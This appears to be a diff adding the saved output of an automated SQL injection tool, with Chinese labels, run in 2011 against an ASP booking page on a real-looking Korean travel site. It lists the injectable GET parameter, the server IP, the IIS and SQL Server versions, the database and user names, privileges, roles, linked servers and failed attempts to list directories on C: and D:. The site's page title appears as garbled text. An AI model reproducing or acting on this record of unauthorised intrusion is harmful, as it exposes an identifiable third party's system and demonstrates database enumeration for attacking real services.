@@ -1,0 +1,100 @@
+■漏洞信息:============================================================
+ ·URL:http://santacruises.bccard.com/free_s/booking.asp?PFlag=W&NP_Flag=B&x=145&y=31&NP_idx=148&NP_StartD=2011-04-25&NCa3=GEA&NCa4=
+ ·页面标题：厚揪墨靛 咯青辑厚胶 : 厚揪捧绢
+ ·参数:PFlag=W&NP_Flag=B&x=145&y=31&NP_idx=148&NP_StartD=2011-04-25&NCa3=GEA&NCa4=
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:121.254.179.169
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 15:06:06 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 89597
+Content-Type: text/html
+Expires: Sun, 03 Apr 2011 15:06:05 GMT
+Set-Cookie: ASPSESSIONIDAQTSQTQR=DGGCJGKDJPHFAAEOLEIFJGHP; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：santatour
+- 用户名：n_santadb
+- 版本：Microsoft SQL Server 2005 - 9.00.4035.00 (Intel X86) 
+	Nov 24 2008 13:01:59 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：SERVER
+- 服务名：MSSQLSERVER
+- 系统用户名：n_santadb
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 0
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master		
+tempdb		
+model		
+msdb		
+santatour		
+santa		
+act		
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.???????慃	04  8 2003  9:10AM	
+dbo			04  8 2003  9:10AM	
+guest		.	04  8 2003  9:10AM	
+db_owner		?..?.......?.	04  8 2003  9:10AM	
+db_accessadmin		?..?.......?.	04  8 2003  9:10AM	
+db_securityadmin		?..?.......?.	04  8 2003  9:10AM	
+db_ddladmin		?..?.......?.	04  8 2003  9:10AM	
+db_backupoperator		?..?.......?.	04  8 2003  9:10AM	
+db_datareader		?..?.......?.	04  8 2003  9:10AM	
+db_datawriter		?..?.......?.	04  8 2003  9:10AM	
+db_denydatareader		?..?.......?.	04  8 2003  9:10AM	
+db_denydatawriter		?..?.......?.	04  8 2003  9:10AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+Internet Information Services	runnable	SERVER179-169	5028	SELECT		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+SERVER	SQL Server	SQLOLEDB	SERVER		SERVER	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+错误代码: 0x80004005
+错误原因: [Microsoft][ODBC 驱动程序管理器] 未发现数据源名称并且未指定默认驱动程序
+Dir of C:: 
+错误代码: 0x80004005
+错误原因: [Microsoft][ODBC 驱动程序管理器] 未发现数据源名称并且未指定默认驱动程序
+Dir of C:: 
+错误代码: 0x80004005
+错误原因: [Microsoft][ODBC 驱动程序管理器] 未发现数据源名称并且未指定默认驱动程序
